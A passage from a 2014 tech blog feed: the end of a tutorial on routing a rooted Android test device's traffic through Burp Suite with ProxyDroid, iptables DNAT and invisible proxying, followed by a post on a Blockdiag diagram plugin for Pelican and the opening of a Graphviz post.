<p>The iptables rules for <code>SOCKS5</code> and <code>SOCKS4</code> are pretty similar:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# iptables -t nat -L

[...]

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
RETURN     tcp  --  anywhere             192.168.1.2
REDIRECT   tcp  --  anywhere             anywhere             redir ports 8123

[...]

</code></pre></div><p>In other words the <em>connection flow</em> looks like this:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
	android-client  -&gt; ProxyDroid;
  	 				   ProxyDroid  -&gt; burp;
  	 				                  burp  -&gt; webserver;
                                      burp &lt;-- webserver;
                       ProxyDroid &lt;-- burp;
  	android-client &lt;-- ProxyDroid;
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx06.png" alt="png"></p>
<h3 id="testing-the-connection">Testing the connection</h3>
<p>Using a <strong>HTTP proxy</strong> we&rsquo;ll test the connection between <strong>android-client</strong> and some webserver out there. Since the connection is proxied through <strong>burp</strong> we should be able to see it. On <strong>android-client</strong> I run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# curl -I http://www.spiegel.de/
HTTP/1.0 200 OK
Date: Sat, 29 Nov 2014 13:09:13 GMT
Cache-Control: max-age=90
Expires: Sat, 29 Nov 2014 13:10:43 GMT
X-SP-TE: 6150
X-Robots-Tag: index, follow, noarchive
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 208782
X-SP-PR: 3958
Vary: Accept-Encoding
Age: 47
X-Cache: HIT from lnxp-3958.srv.mediaways.net
X-Cache-Lookup: HIT from lnxp-3958.srv.mediaways.net:101
Via: 1.1 www.spiegel.de, 1.0 lnxp-3958.srv.mediaways.net (squid/3.1.4)
Connection: close
</code></pre></div><p>On <strong>burp</strong> I can see the request:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">HEAD / HTTP/1.1
User-Agent: curl/7.21.0 (arm-unknown-linux-gnueabi) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6
Host: www.spiegel.de
Accept: */*
Proxy-Connection: close
Connection: close
</code></pre></div><p>So everything is ok, for now. But that&rsquo;s not the purpose of this post. Let&rsquo;s have a look at another text-based protocol we&rsquo;d like to sniff using <strong>burp</strong>.</p>
<h3 id="ssdp">SSDP</h3>
<p>Using <strong>SSDP</strong> I&rsquo;d like to find any <em>UPnp</em> devices available on the LAN. All you need to do is to send an UDP message to the multicast address <code>239.255.255.250</code> on port <code>1900</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MX: 5
Man: â€œssdp:discoverâ€
ST: urn:schemas-upnp-org:device:MediaRenderer:1
</code></pre></div><p>Usually you can use <code>netcat</code> to send the request. In that case you should use:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# cat m-search.txt
M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MX: 5
Man: â€œssdp:discoverâ€
ST: urn:schemas-upnp-org:device:MediaRenderer:1

android-client# netcat 239.255.255.250 1900 &lt; m-search.txt
(UNKNOWN) [239.255.255.250] 1900 (?) : Network is unreachable 
</code></pre></div><p>Hmm&hellip;That&rsquo;s bad! Let&rsquo;s use another <a href="https://gist.github.com/provegard/1435555">SSDP client</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# python ssdp-test.py client 192.168.1.3
Received M-SEARCH * HTTP/1.1 from (&#39;192.168.1.49&#39;, 62861)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received NOTIFY * HTTP/1.1 from (&#39;192.168.1.254&#39;, 34682)
Received M-SEARCH * HTTP/1.1 from (&#39;192.168.1.49&#39;, 62861)
</code></pre></div><p>Obviously we have found some devices. And because the requests were sent on <code>destination-port = 1900</code> you won&rsquo;t see them on <strong>burp</strong>. This is where <em>ProxyDroid</em> shows its first weakness. In general you&rsquo;re going to run into troubles if your requests are sent to a port different from <code>80</code> or <code>443</code>. So we need a more <em>generic</em> solution.</p>
<h3 id="port-forwarding">Port forwarding</h3>
<p>Using <em>iptables</em> I&rsquo;ll re-route the traffic destinated to some specific <em>port</em> directly to <em>burp</em>.Without any proxies the connection &ldquo;flows&rdquo; between the client and the server. Using a proxy between them you&rsquo;ll have sth like this:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <p>digraph G {
graph [rankdir = LR];
node[shape=record];</p>
<pre><code>  Proxy  [label=&quot;{ { &lt;i1&gt; Input: Port | &lt;i2&gt;Input: Data } | &lt;proxy&gt;proxy | { &lt;o1&gt; Output: Port | &lt;o2&gt; Output: Data } }&quot;];
  Client [label=&quot;{ { &lt;p1&gt; Source Port | &lt;p2&gt; Data | &lt;p3&gt; Other Headers} | &lt;client&gt;android-client }&quot;];
  Server [label=&quot;{ webserver | { &lt;p1&gt; Destination Port | &lt;p2&gt; Data | &lt;p3&gt; Other Headers } }&quot;];


  Client:client -&gt; Proxy [color=red];
  Proxy -&gt; Server [color=red];
</code></pre>
<p>}</p>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/proxy.dot.png" alt=""></p>
<p>And this is where <strong>NAT</strong> comes into play. The 3 major NAT types are described below:</p>
<ol>
<li><strong>SNAT</strong></li>
</ol>
<p><strong>Souce NAT</strong> changes the <em>source</em> address/port in the IP header of a packet to sth different. SNAT is commonly done in the <strong>POSTROUTING</strong> chain, just before the packet will be sent out. That means that everything on the box itself (routing, filtering etc.) will see the packet unchanged. For more detailed reading have a look at <a href="http://www.netfilter.org/documentation/HOWTO/NAT-HOWTO-6.html">netfilter - NAT Howto</a>.</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>blockdiag {
  Client [label=&quot;Client\n1.1.1.1&quot;, shape=cisco.pc]; 
  NAT [label=&quot;NAT\n2.2.2.2&quot;, shape=cisco.router];
  Server [label=&quot;Server\n3.3.3.3&quot;, shape=cisco.www_server];
  CN [label=&quot;Packet\n\nFrom: 1.1.1.1:4192\nTo: 3.3.3.3:8080&quot;, height=80, width=170, color=&quot;orange&quot;];
  NS [label=&quot;Packet\n\nFrom: 2.2.2.2:14567\nTo: 3.3.3.3:8080&quot;, height=80, width=170, color=&quot;orange&quot;];

  NC [label=&quot;Packet\n\nFrom: 3.3.3.3:8080\nTo: 1.1.1.1:4192&quot;, height=80, width=170, color=&quot;lightblue&quot;];
  SN [label=&quot;Packet\n\nFrom: 3.3.3.3:8080\nTo: 2.2.2.2:14567&quot;, height=80, width=170, color=&quot;lightblue&quot;];

  Client -&gt; CN -&gt; NAT [color=&quot;orange&quot;];
  NAT -&gt; NS -&gt; Server [color=&quot;orange&quot;];
  NAT &lt;- SN &lt;- Server [color=&quot;lightblue&quot;];
  Client &lt;- NC &lt;- NAT [color=&quot;lightblue&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx07.png" alt="png"></p>
<ul>
<li>Client &ndash;&gt; Server (orange)</li>
</ul>
<p>The <code>Client</code> (1.1.1.1) wants to send a request to the <code>Server</code> (3.3.3.3). Therefore a <code>packet</code> is sent from the Client (source port 4192) to the Server (3.3.3.3:8080). On its way to the destination the packet gets modified, so that the source IP address is changed to the address of the NAT &ldquo;router&rdquo; (2.2.2.2). Besides that the source port of the packet is changed as well (14567).</p>
<ul>
<li>Server &ndash;&gt; Client (lightblue)</li>
</ul>
<p>The Server (3.3.3.3) responds to the request by sending back a packet to the NAT router (2.2.2.2:14567). The NAT router does some mapping and realizes that <code>2.2.2.2:14567</code> is mapped to <code>1.1.1.1:4192</code>. The packet originating from the Server is then once again modified: The <em>source</em> IP address is replaced by the Servers one (3.3.3.3:8080).</p>
<ol start="2">
<li><strong>DNAT</strong></li>
</ol>
<p><strong>Destination NAT</strong> changes the <em>destination</em> address/port in the IP header of a packet. This is usually done in the <strong>PREROUTING</strong> chain, right after the packet has arrived. For my purpose I&rsquo;ll be using the <em>OUTPUT</em> chain to do DNAT. Since the packets are modified before leaving the network interface</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>blockdiag {
  Client [label=&quot;Client\n1.1.1.1&quot;, shape=cisco.pc]; 
  NAT [label=&quot;NAT\n2.2.2.2&quot;, shape=cisco.router];
  Server [label=&quot;Server\nx.x.x.x&quot;, shape=cisco.www_server];
  CN [label=&quot;Packet\n\nFrom: 1.1.1.1:4192\nTo: 3.3.3.3:8080&quot;, height=80, width=170, color=&quot;orange&quot;];
  NS [label=&quot;Packet\n\nFrom: 1.1.1.1:4192\nTo: x.x.x.x:yyyy&quot;, height=80, width=170, color=&quot;orange&quot;];

  Client -&gt; CN -&gt; NAT [color=&quot;orange&quot;];
  NAT -&gt; NS -&gt; Server [color=&quot;orange&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-non-proxy-aware-android-burp/xx08.png" alt="png"></p>
<ol start="3">
<li><strong>MASQUERADING</strong></li>
</ol>
<p><strong>SNAT</strong> and <strong>MASQUERADING</strong> are pretty much the same, since they both change the source address as soon as the packets depart the host (POSTROUTING). Masquerading refers to the address translation allowing all the hosts on a (private) network to use another network (like the Internet) at the price of a single IP address. If your external address is variable (per DHCP) then Masquerading is the place to be. If instead your outgoing interface has a static IP address you don&rsquo;t need it and one can use SNAT.</p>
<blockquote>
<p><a href="http://serverfault.com/questions/119365/what-is-the-difference-between-a-source-nat-destination-nat-and-masquerading">What is the difference between a Source NAT, Destination NAT and Masquerading?</a></p>
</blockquote>
<h3 id="port-forwarding-on-the-client">Port forwarding on the client</h3>
<p>Now we&rsquo;re ready to implement port forwarding on the client. We&rsquo;ll try to intercept all text-based traffic (like SSDP / HTTP etc.) destinated to <strong>port 8000</strong>. First of all we&rsquo;ll add <em>DNAT</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# iptables -t nat -A OUTPUT -p tcp --dport 8000 -j DNAT --to-destination 192.168.1.2:8080
</code></pre></div><p>This will &ldquo;forward&rdquo; all host generated traffic destinated at port 1900 to <code>192.168.1.2:8080</code> (Burp instance). Recall iptables packet traversal scheme: The rule is being added to the <em>OUTPUT</em> chain before the packet reaches the <em>POSTROUTING</em> chain.</p>
<h4 id="server-listening-">Server listening &hellip;</h4>
<p>The Server (dornea.nu) will listen for incoming connections on port 8080:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">server$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...

</code></pre></div><h4 id="client---server">Client -&gt; Server</h4>
<p>On the Client we&rsquo;ll use curl to access the Server:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# curl -I http://dornea.nu:8000/
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.1.3
Date: Sat, 29 Nov 2014 12:56:37 GMT
Content-type: text/html; charset=ascii
Content-Length: 2952


</code></pre></div><p>So obviously the packet reached its destination.</p>
<h4 id="dude-wheres-my-packet">Dude, where&rsquo;s my packet?</h4>
<p>Sniffing for packets destinated to port 8000 won&rsquo;t give you any results:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# tshark port 8000
Capturing on wlan0


</code></pre></div><p>While triggering the <code>curl</code> command you won&rsquo;t be able to see the outgoing packets destinated to <code>http://dornea.nu:8000</code>. While rewriting the IP packet destination, the packet is <strong>not</strong> passed to the interface the address belongs to. It is handled by the network stack directly (<a href="http://serverfault.com/questions/502003/tcpdump-not-picking-up-traffic-redirected-by-iptables">SE answer</a>).</p>
<h4 id="what-about-burp">What about Burp?</h4>
<p>On <em>burp</em> you won&rsquo;t see anything. How comes? And this is the point where we come the final conclusion and also the main reason I&rsquo;ve written this post (sorry for the long prologue :)). And the reason is actually pretty &ldquo;invisible&rdquo; and can be found in Burps proxy options:</p>
<p><img src="/posts/img/2014/38a52fceb67b54c86e46548098cd31ecee8f456c.png" alt="Burp invisible option"></p>
<p>It&rsquo;s all about Burps <a href="http://portswigger.net/burp/help/proxy_options_invisible.html">invisible proxying</a>. It basically enables proxy support for non-proxy-aware clients to be able to connect directly to the listener (Burp). Editing the proxy options (Request Handling) you&rsquo;ll find these options:</p>
<p><img src="/img/2014/6899841c0a375a2a5ad1f5108ac0d62efab8fd79.png" alt="Burp non-proxy-aware support"></p>
<p>Make sure you activate &ldquo;Support invisible proxying&rdquo;. Afterwards you can trigger <code>curl</code> again to see if it works:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">android-client# curl -I http://dornea.nu:8000/
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.1.3
Date: Sat, 29 Nov 2014 13:43:56 GMT
Content-type: text/html; charset=ascii
Content-Length: 2952

</code></pre></div><p>On <strong>burp</strong> I&rsquo;ve seen:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">HEAD / HTTP/1.1
User-Agent: curl/7.21.0 (arm-unknown-linux-gnueabi) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6
Host: dornea.nu:8000
Accept: */*
</code></pre></div><p>Perfect!</p>
<h2 id="no-iptables">No iptables?!</h2>
<p>Ok, using iptables you&rsquo;re ready to implement port forwarding. But what if your device does <strong>not</strong> have iptables or anything similar even installed? I usually root or jailbreak my test devices for better handling but in case you can&rsquo;t you won&rsquo;t be able to do NATing on the device itself. In that case maybe a <strong>VPN</strong> would help. Just install a <em>VPN server</em> on the host running the <strong>burp</strong> instance and connect your devices to it. This way you should be able to set a HTTP proxy for your devices. I honestly admit I don&rsquo;t really know if this is going to work for 100%. Test for yourself and let me know. But since this problem affects me as well there&rsquo;ll be probably another post regarding this issue :). Stay tuned.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Using Blockdiag with Pelican and liquid tags</title>
      <link>https://blog.dornea.nu/2014/11/21/using-blockdiag-with-pelican-and-liquid-tags/</link>
      <pubDate>Fri, 21 Nov 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/11/21/using-blockdiag-with-pelican-and-liquid-tags/</guid>
      <content:encoded><![CDATA[<p>After writing the <a href="/2014/11/13/using-graphviz-with-pelican-and-liquid-tags/">previous article</a> I thought I should share some <code>Blockdiag</code> plugin for Pelican. You can also check out the <a href="https://github.com/getpelican/pelican-plugins/pull/356"><strong>pull request</strong></a>.</p>
<h2 id="blockdiag">blockdiag</h2>
<p>It&rsquo;s basically a <code>graphviz</code> like utility with its own language (similar to DOT). You can create:</p>
<ul>
<li><a href="http://blockdiag.com/en/blockdiag/">block diagrams</a></li>
<li><a href="http://blockdiag.com/en/seqdiag/">sequence diagrams</a></li>
<li><a href="http://blockdiag.com/en/actdiag/">activity diagrams</a></li>
<li><a href="http://blockdiag.com/en/nwdiag/">network diagrams</a></li>
<li><a href="http://blockdiag.com/en/nwdiag/rackdiag-examples.html">rack diagrams</a></li>
<li><a href="http://blockdiag.com/en/nwdiag/packetdiag-examples.html">packet diagrams</a></li>
</ul>
<p>It can save you a lot of time and has a pretty simple syntax. You can always test your code <strong>online</strong> using blockdiag&rsquo;s interactive <a href="http://interactive.blockdiag.com/">shell</a>.</p>
<h4 id="extensions">Extensions</h4>
<p>There are also several contributions made to <code>blockdiag</code>. Among these:</p>
<ul>
<li><a href="https://pypi.python.org/pypi/blockdiagcontrib-math">blockdiagcontrib-math</a></li>
<li><a href="https://pypi.python.org/pypi/blockdiagcontrib-tex/">blockdiagcontrib-tex</a></li>
<li><a href="http://pythonhosted.org//blockdiagcontrib-octicons/">blockdiagcontrib-octicons</a></li>
<li><a href="https://pythonhosted.org/blockdiagcontrib-cisco/">blockdiagcontrib-cisco</a></li>
<li><a href="https://pypi.python.org/pypi/blockdiagcontrib-class">blockdiagcontrib-class</a></li>
</ul>
<h2 id="pelican-plugin">pelican plugin</h2>
<p>In general the syntax is pretty simple:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
    &lt;diagram type&gt; {
        &lt;code&gt;
    }
%}
</code></pre></div><p>As already mentioned the <code>diagram type</code> could be one of the following:</p>
<ul>
<li>blockdiag</li>
<li>seqdiag</li>
<li>actdiag</li>
<li>nwdiag</li>
<li>rackdiag</li>
<li>packetdiag</li>
</ul>
<p>Just a few examples:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
    blockdiag {
        A -&gt; B -&gt; C;
        B -&gt; D;
    }
%}
</code></pre></div><p>will render to</p>
<p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx02.png" alt="png"></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
    nwdiag {
      network dmz {
        web01;
        web02;
        stg01;
      }
 
      network internal {
        web01;
        web02;
        db01;
        db02;
      }
    }
%}
</code></pre></div><p>will render to</p>
<p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx04.png" alt="png"></p>
<h2 id="fonts">Fonts</h2>
<p>Regarding the <strong>font</strong>: You can add following to your <code>~/.blockdiagrc</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[blockdiag]
fontpath = /usr/share/fonts/TTF/DejaVuSerif.ttf 
</code></pre></div><h2 id="playground">Playground</h2>
<p>Let&rsquo;s look at some other examples:</p>
<h3 id="blockdiag-1">blockdiag</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	blockdiag admin {
	  index [label = &#34;List of FOOs&#34;];
	  add [label = &#34;Add FOO&#34;];
	  add_confirm [label = &#34;Add FOO (confirm)&#34;];
	  edit [label = &#34;Edit FOO&#34;];
	  edit_confirm [label = &#34;Edit FOO (confirm)&#34;];
	  show [label = &#34;Show FOO&#34;];
	  delete_confirm [label = &#34;Delete FOO (confirm)&#34;];

	  index -&gt; add  -&gt; add_confirm  -&gt; index;
	  index -&gt; edit -&gt; edit_confirm -&gt; index;
	  index -&gt; show -&gt; index;
	  index -&gt; delete_confirm -&gt; index;
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx06.png" alt="png"></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	blockdiag {
	   // Set labels to nodes.
	   A [label = &#34;foo&#34;];
	   B [label = &#34;bar&#34;];
	   // And set text-color
	   C [label = &#34;baz&#34;, numbered = 99];

	   // Set labels to edges. (short text only)
	   A -&gt; B [label = &#34;click bar&#34;, textcolor=&#34;red&#34;];
	   B -&gt; C [label = &#34;click baz&#34;];
	   C -&gt; A;
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx09.png" alt="png"></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	blockdiag {
	  A -&gt; B -&gt; C -&gt; D -&gt; E;

	  // fold edge at C to D (D will be layouted at top level; left side)
	  C -&gt; D [folded];
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx11.png" alt="png"></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	blockdiag {
	  // node shapes for flowcharts
	  condition [shape = flowchart.condition];
	  database [shape = flowchart.database];
	  terminator [shape = flowchart.terminator];
	  input [shape = flowchart.input];

	  condition -&gt; database -&gt; terminator -&gt; input;
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx12.png" alt="png"></p>
<h4 id="blockdiagcontrib-cisco">blockdiagcontrib-cisco</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag 
	diagram admin {
	  A [shape = &#34;cisco.router&#34;];
	  B [shape = &#34;cisco.ups&#34;];

	  A -&gt; B;
	}
%}
</code></pre></div><blockquote>
<p>If you get an exception like <code>AttributeError: close</code> have a look at this <a href="https://bitbucket.org/blockdiag/blockdiag/issue/63/attributeerror-close">issue</a></p>
</blockquote>
<h4 id="blockdiagcontrib-octicons">blockdiagcontrib-octicons</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	blockdiag {
	  plugin octicons;

	  A [label = &#34;&#34;, background = &#34;octicon://mark-github&#34;];
	  B [icon = &#34;octicon://cloud-download?color=red&#34;];
	  C [icon = &#34;octicon://settings?color=green&#34;]
	  A -&gt; B;
	  B -&gt; C;
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx17.png" alt="png"></p>
<blockquote>
<p>If you have problems generating the <strong>octicons</strong> have a look at this <a href="https://bitbucket.org/blockdiag/blockdiag-contrib/issue/2/blockdiagcontrib-octicons-cannot-open">issue</a></p>
</blockquote>
<h3 id="seqdiag">seqdiag</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	seqdiag {
	  browser  -&gt; webserver [label = &#34;GET /index.html&#34;];
	  browser &lt;-- webserver;
	  browser  -&gt; webserver [label = &#34;POST /blog/comment&#34;];
	              webserver  -&gt; database [label = &#34;INSERT comment&#34;];
	              webserver &lt;-- database;
	  browser &lt;-- webserver;
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx18.svg" alt="png"></p>
<h3 id="actdiag">actdiag</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	actdiag {
	  A -&gt; B -&gt; C -&gt; D -&gt; E;

	  lane {
	    A; C; E;
	  }
	  lane {
	    B; D;
	  }
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx21.png" alt="png"></p>
<h3 id="nwdiag">nwdiag</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	nwdiag {
	  network dmz {
	      address = &#34;210.x.x.x/24&#34;

	      web01 [address = &#34;210.x.x.1&#34;];
	      web02 [address = &#34;210.x.x.2&#34;];
	  }
	  network internal {
	      address = &#34;172.x.x.x/24&#34;;

	      web01 [address = &#34;172.x.x.1&#34;];
	      web02 [address = &#34;172.x.x.2&#34;];
	      db01;
	      db02;
	  }
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx22.png" alt="png"></p>
<h4 id="nwdiag-more-advanced">nwdiag more advanced</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	nwdiag {
	class obj_old		[color = lighgray,style = dotted];
	class obj_new		[color = lightblue,style = dotted];
	class obj_null		[style = dotted,stacked];
	class obj_router	[shape = cisco.router];
	class obj_l2sw		[shape = cisco.layer_2_remote_switch];
 	class obj_fw		[shape = cisco.firewall];
	class obj_wlan		[shape = cisco.wireless_router];
	class obj_pc		[shape = cisco.pc];
	class obj_mobile	[shape = cisco.pda];

	network untrust {
		address = &#34;X.X.X.0/28&#34;

		main-router	[address = &#34;.n&#34;,class = obj_router];
	}

	network dmz {
		address = &#34;192.168.X.0/24&#34;

		main-router	[address = &#34;.n\ndmz/24 only&#34;,class = obj_router];
		debian-fw1	[address = &#34;.n+16&#34;,class = obj_fw];
		debian-fw2	[address = &#34;.m+17&#34;,class = obj_fw];
	}
	network trust {
		address = &#34;172.X.X.0/24&#34;

		VLAN-Switch	[address = &#34;.n&#34;,class = obj_l2sw];
		debian-fw1	[address = &#34;.n+16\n&lt;-&gt;VLAN-Switch only&#34;,class = obj_fw];
		debian-fw2	[address = &#34;.n+17\n&lt;-&gt;VLAN-Switch only&#34;,class = obj_fw];
		nat-router	[address = &#34;.n+64\n&lt;-&gt;VLAN-Switch only&#34;,class = obj_router];
	}
	network wlan-seg {
		address = &#34;10.X.X.0/24&#34;

		nat-router	[address = &#34;.n+64\n&lt;-&gt;wlan-router&#39;s IP only&#34;,class = obj_router];
		wlan-router	[address = &#34;.n\n&lt;-&gt;sheeva-debian only\n&lt;-&gt;note-debian only&#34;,class = obj_wlan];
		sheeva-debian	[address = &#34;.n+16&#34;,class = obj_pc];
		note-debian	[address = &#34;.n+17&#34;,class = obj_pc];
		iPod		[address = &#34;.n+128&#34;,class = obj_mobile];
		Android		[address = &#34;.n+129&#34;,class = obj_mobile];
	}
}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx25.png" alt="png"></p>
<h3 id="packetdiag">packetdiag</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag 
	packetdiag {
	   0-7: Source Port
	   8-15: Destination Port
	   16-31: Sequence Number
	   32-47: Acknowledgment Number
	}
    
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx27.png" alt="png"></p>
<h3 id="rackdiag">rackdiag</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{% blockdiag
	rackdiag {
	  24U;

	  1: UPS [3U, 0.5A, 10kg];
	  5: Disk Array [2U, 0.5A];
	  7: DB Master
	  8: DB Mirror (1)
	  9: DB Mirror (2)
	  11: Web Server (1)
	  11: Web Server (2)
	  12: Web Server (3)
	  12: Web Server (4)
	  14: LoadBalancer
	}
%}
</code></pre></div><p><img src="/posts/img/2014/using-blockdiag-with-pelican-and-liquid-tags/xx29.png" alt="png"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Using Graphviz with Pelican and liquid tags</title>
      <link>https://blog.dornea.nu/2014/11/13/using-graphviz-with-pelican-and-liquid-tags/</link>
      <pubDate>Thu, 13 Nov 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/11/13/using-graphviz-with-pelican-and-liquid-tags/</guid>
      <content:encoded><![CDATA[<p>I really like keeping things simple. And I also like generating figures from code using <code>Graphviz</code>. And since there was no Graphviz <strong>plugin</strong> for <strong>pelican</strong> I wrote my own one.</p>
